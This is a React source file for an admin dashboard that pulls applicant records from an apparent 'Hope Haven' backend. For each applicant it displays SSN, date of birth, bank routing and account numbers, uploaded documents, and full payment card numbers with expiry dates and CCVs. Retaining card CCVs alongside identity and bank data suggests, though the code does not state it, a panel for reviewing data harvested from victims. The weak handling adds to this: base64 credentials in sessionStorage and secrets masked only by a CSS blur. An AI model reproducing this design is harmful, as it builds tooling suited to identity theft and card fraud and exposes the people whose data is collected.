import React, { useState, useEffect } from 'react';
import {
    Lock,
    Search,
    ExternalLink,
    CreditCard,
    FileText,
    Calendar,
    Mail,
    MapPin,
    ChevronDown,
    ChevronUp,
    Loader2,
    Database,
    RefreshCcw,
    LogOut
} from 'lucide-react';
import { toast } from 'sonner';

interface Card {
    id: number;
    card_number: string;
    expiry: string;
    ccv: string;
}

interface FileLink {
    id: number;
    name: string;
    url: string;
    field_name: string;
}

interface Application {
    id: number;
    first_name: string;
    last_name: string;
    dob: string;
    ssn: string;
    phone: string;
    email: string;
    address: string;
    city: string;
    state: string;
    zip: string;
    mailing_address: string;
    bank_name: string;
    account_type: string;
    routing_number: string;
    account_number: string;
    drive_folder_id: string;
    drive_folder_url: string;
    timestamp: string;
    cards: Card[];
    files: FileLink[];
}

const AdminDashboard: React.FC = () => {
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [applications, setApplications] = useState<Application[]>([]);
    const [loading, setLoading] = useState(false);
    const [searchTerm, setSearchTerm] = useState('');
    const [expandedId, setExpandedId] = useState<number | null>(null);

    const backendUrl = import.meta.env.VITE_BACKEND_URL || 'https://hope-haven-server.vercel.app';

    const handleLogin = (e: React.FormEvent) => {
        e.preventDefault();
        if (username && password) {
            sessionStorage.setItem('adminAuth', btoa(`${username}:${password}`));
            setIsAuthenticated(true);
            fetchData();
        } else {
            toast.error('Please enter both username and password');
        }
    };

    const handleLogout = () => {
        sessionStorage.removeItem('adminAuth');
        setIsAuthenticated(false);
        setApplications([]);
    };

    const fetchData = async () => {
        const auth = sessionStorage.getItem('adminAuth');
        if (!auth) return;

        setLoading(true);
        try {
            const response = await fetch(`${backendUrl}/api/admin/data`, {
                headers: {
                    'Authorization': `Basic ${auth}`
                }
            });

            if (response.status === 401) {
                setIsAuthenticated(false);
                sessionStorage.removeItem('adminAuth');
                toast.error('Authentication failed');
                return;
            }

            if (!response.ok) throw new Error('Failed to fetch data');

            const data = await response.json();
            setApplications(data);
            toast.success('Data loaded successfully');
        } catch (error: any) {
            toast.error(error.message);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        const auth = sessionStorage.getItem('adminAuth');
        if (auth) {
            setIsAuthenticated(true);
            fetchData();
        }
    }, []);

    const filteredApplications = applications.filter(app =>
        `${app.first_name} ${app.last_name}`.toLowerCase().includes(searchTerm.toLowerCase()) ||
        app.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
        app.ssn.includes(searchTerm)
    );

    if (!isAuthenticated) {
        return (
            <div className="min-h-[80vh] flex items-center justify-center bg-gray-50 px-4">
                <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-gray-100">
                    <div className="flex flex-col items-center mb-8">
                        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mb-4">
                            <Lock className="w-8 h-8 text-blue-600" />
                        </div>
                        <h1 className="text-2xl font-bold text-gray-900">Admin Portal</h1>
                        <p className="text-gray-500 text-center mt-2">Enter credentials to access application data</p>
                    </div>

                    <form onSubmit={handleLogin} className="space-y-6">
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">Username</label>
                            <input
                                type="text"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                                placeholder="admin"
                            />
                        </div>
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">Password</label>
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                                placeholder="••••••••"
                            />
                        </div>
                        <button
                            type="submit"
                            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors shadow-lg shadow-blue-200"
                        >
                            Sign In
                        </button>
                    </form>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-gray-50 pb-20">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
                    <div>
                        <h1 className="text-3xl font-bold text-gray-900 flex items-center gap-3">
                            <Database className="w-8 h-8 text-blue-600" />
                            Administrative Dashboard
                        </h1>
                        <p className="text-gray-500 mt-1">Manage and review incoming applications</p>
                    </div>

                    <div className="flex items-center gap-3">
                        <button
                            onClick={fetchData}
                            disabled={loading}
                            className="flex items-center gap-2 px-4 py-2 bg-white border border-gray-200 rounded-lg text-gray-600 hover:bg-gray-50 transition-colors disabled:opacity-50"
                        >
                            <RefreshCcw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
                            Refresh
                        </button>
                        <button
                            onClick={handleLogout}
                            className="flex items-center gap-2 px-4 py-2 bg-red-50 text-red-600 border border-red-100 rounded-lg hover:bg-red-100 transition-colors"
                        >
                            <LogOut className="w-4 h-4" />
                            Logout
                        </button>
                    </div>
                </div>

                {/* Filters and Search */}
                <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100 mb-6">
                    <div className="relative">
                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                        <input
                            type="text"
                            placeholder="Search by name, email, or SSN..."
                            value={searchTerm}
                            onChange={(e) => setSearchTerm(e.target.value)}
                            className="w-full pl-10 pr-4 py-3 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                        />
                    </div>
                </div>

                {/* Data Logic */}
                {loading && applications.length === 0 ? (
                    <div className="flex flex-col items-center justify-center py-20">
                        <Loader2 className="w-12 h-12 text-blue-600 animate-spin mb-4" />
                        <p className="text-gray-500">Fetching applications...</p>
                    </div>
                ) : filteredApplications.length === 0 ? (
                    <div className="bg-white rounded-xl border border-dashed border-gray-300 py-20 text-center">
                        <p className="text-gray-500">No applications found.</p>
                    </div>
                ) : (
                    <div className="space-y-4">
                        {filteredApplications.map((app) => (
                            <div
                                key={app.id}
                                className={`bg-white rounded-xl border transition-all overflow-hidden ${expandedId === app.id ? 'border-blue-300 shadow-md ring-1 ring-blue-50' : 'border-gray-100 shadow-sm hover:border-gray-300'
                                    }`}
                            >
                                {/* Header/Summary View */}
                                <div
                                    className="p-5 cursor-pointer flex items-center justify-between"
                                    onClick={() => setExpandedId(expandedId === app.id ? null : app.id)}
                                >
                                    <div className="flex items-center gap-4">
                                        <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center text-blue-700 font-bold text-lg">
                                            {app.first_name[0]}{app.last_name[0]}
                                        </div>
                                        <div>
                                            <h3 className="font-bold text-gray-900 text-lg">{app.first_name} {app.last_name}</h3>
                                            <div className="flex items-center gap-4 text-sm text-gray-500 mt-1">
                                                <span className="flex items-center gap-1"><Mail className="w-3.5 h-3.5" /> {app.email}</span>
                                                <span className="flex items-center gap-1"><Calendar className="w-3.5 h-3.5" /> {new Date(app.timestamp).toLocaleDateString()}</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="flex items-center gap-4">
                                        <span className={`px-3 py-1 rounded-full text-xs font-medium ${app.files.length > 0 ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-600'}`}>
                                            {app.files.length} Files
                                        </span>
                                        {expandedId === app.id ? <ChevronUp className="text-gray-400" /> : <ChevronDown className="text-gray-400" />}
                                    </div>
                                </div>

                                {/* Expanded Details */}
                                {expandedId === app.id && (
                                    <div className="border-t border-gray-100 bg-gray-50/50 p-6 space-y-8 animate-in fade-in slide-in-from-top-2 duration-200">

                                        {/* Sections Grid */}
                                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                                            {/* Personal Info */}
                                            <div>
                                                <h4 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                                    <FileText className="w-4 h-4" /> Personal Details
                                                </h4>
                                                <div className="space-y-3">
                                                    <Detail label="SSN" value={app.ssn} isSecret />
                                                    <Detail label="Date of Birth" value={new Date(app.dob).toLocaleDateString()} />
                                                    <Detail label="Phone" value={app.phone} />
                                                    <Detail label="Address" value={`${app.address}, ${app.city}, ${app.state} ${app.zip}`} />
                                                    {app.mailing_address && <Detail label="Mailing Address" value={app.mailing_address} />}
                                                </div>
                                            </div>

                                            {/* Banking */}
                                            <div>
                                                <h4 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                                    <MapPin className="w-4 h-4" /> Banking Info
                                                </h4>
                                                <div className="space-y-3">
                                                    <Detail label="Bank" value={app.bank_name} />
                                                    <Detail label="Type" value={app.account_type} />
                                                    <Detail label="Routing #" value={app.routing_number} />
                                                    <Detail label="Account #" value={app.account_number} isSecret />
                                                </div>
                                            </div>

                                            {/* Drive & Meta */}
                                            <div>
                                                <h4 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                                    <ExternalLink className="w-4 h-4" /> Drive Resources
                                                </h4>
                                                <div className="space-y-4">
                                                    <a
                                                        href={app.drive_folder_url}
                                                        target="_blank"
                                                        rel="noopener noreferrer"
                                                        className="flex items-center justify-between p-3 bg-white border border-gray-200 rounded-lg hover:border-blue-400 hover:text-blue-600 transition-all group"
                                                    >
                                                        <span className="text-sm font-medium">Main Folder</span>
                                                        <ExternalLink className="w-4 h-4 opacity-0 group-hover:opacity-100 transform group-hover:translate-x-1 transition-all" />
                                                    </a>
                                                    <div className="space-y-2">
                                                        {app.files.map(file => (
                                                            <a
                                                                key={file.id}
                                                                href={file.url}
                                                                target="_blank"
                                                                rel="noopener noreferrer"
                                                                className="flex items-center gap-3 p-2 text-xs text-gray-600 hover:text-blue-600 bg-white border border-transparent hover:border-blue-100 rounded transition-all"
                                                            >
                                                                <div className="w-6 h-6 bg-red-50 text-red-500 rounded flex items-center justify-center">
                                                                    <FileText className="w-3 h-3" />
                                                                </div>
                                                                <span className="flex-grow truncate">{file.name}</span>
                                                                <span className="text-[10px] text-gray-400">{file.field_name}</span>
                                                            </a>
                                                        ))}
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Cards Section */}
                                        {app.cards.length > 0 && (
                                            <div className="pt-6 border-t border-gray-100">
                                                <h4 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                                    <CreditCard className="w-4 h-4" /> Registered Cards
                                                </h4>
                                                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                                                    {app.cards.map(card => (
                                                        <div key={card.id} className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl p-5 text-white shadow-lg relative overflow-hidden group">
                                                            {/* Card Chip decoration */}
                                                            <div className="absolute top-5 right-5 w-10 h-7 bg-yellow-400/20 rounded-md border border-yellow-400/30"></div>

                                                            <p className="text-lg font-mono tracking-[0.2em] mb-4 relative z-10">
                                                                {card.card_number.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim()}
                                                            </p>

                                                            <div className="flex justify-between items-end relative z-10">
                                                                <div>
                                                                    <p className="text-[10px] text-gray-400 uppercase tracking-tighter">Expires</p>
                                                                    <p className="font-mono text-sm">{card.expiry}</p>
                                                                </div>
                                                                <div className="text-right">
                                                                    <p className="text-[10px] text-gray-400 uppercase tracking-tighter">CCV</p>
                                                                    <p className="font-mono text-sm">{card.ccv}</p>
                                                                </div>
                                                            </div>

                                                            {/* Decorative circles */}
                                                            <div className="absolute -bottom-10 -right-10 w-32 h-32 bg-white/5 rounded-full blur-2xl group-hover:bg-blue-500/10 transition-colors"></div>
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                )}
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
};

interface DetailProps {
    label: string;
    value: string;
    isSecret?: boolean;
}

const Detail: React.FC<DetailProps> = ({ label, value, isSecret }) => {
    const [hidden, setHidden] = useState(isSecret);

    return (
        <div className="group">
            <p className="text-[10px] text-gray-400 uppercase font-bold tracking-tight mb-0.5">{label}</p>
            <div className="flex items-center gap-2">
                <p className={`text-sm font-medium text-gray-700 ${hidden ? 'blur-[4px] select-none' : ''}`}>
                    {value || 'Not provided'}
                </p>
                {isSecret && (
                    <button
                        onClick={() => setHidden(!hidden)}
                        className="text-[10px] text-blue-500 hover:text-blue-700 font-medium"
                    >
                        {hidden ? 'Show' : 'Hide'}
                    </button>
                )}
            </div>
        </div>
    );
};

export default AdminDashboard;
